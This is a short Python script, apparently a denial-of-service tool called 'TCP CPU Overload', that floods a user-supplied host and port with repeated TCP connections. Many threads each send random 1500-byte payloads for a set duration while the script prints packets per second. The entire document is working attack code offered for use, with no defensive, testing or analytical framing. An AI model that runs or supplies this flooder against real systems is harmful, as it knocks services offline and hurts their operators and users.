#!/usr/bin/python
# -*- coding: utf-8 -*-
# TCP CPU Overload Script by Lenoir
from socket import create_connection
from sys import argv
from threading import Thread
from time import sleep, time
from os import urandom


print("TCP CPU Overload by Lenoir")
if len(argv)<5 or not argv[3].isdigit() or int(argv[3])<1 or not argv[4].isdigit() or int(argv[4])<1 or not argv[2].isdigit() or not 0<int(argv[2])<65536:
  exit(f"Usage: python {argv[0]} <IP/URL> <port, 1-65535> <threads> <duration, in seconds>")

iterater = 0

# Show packets per second while attacking
# True: Show packets
# False: Do not show packets
show_pps = True

def run():
   global iterater
   for _ in range(500000*500000):
      try:
         conn = create_connection((argv[1], int(argv[2])), 10)
         conn.sendall(urandom(1500))
         iterater += 1
      except:
         continue


print(f"Flooding {argv[1]}:{argv[2]} with {argv[3]} threads for {argv[4]} seconds...")
for _ in range(int(argv[3])):
  Thread(target=run, daemon=True).start()

start = time()
while int(time() - start)<int(argv[4]):
   sleep(1)
   if show_pps:
     print("Packets per second:", iterater)
   iterater = 0
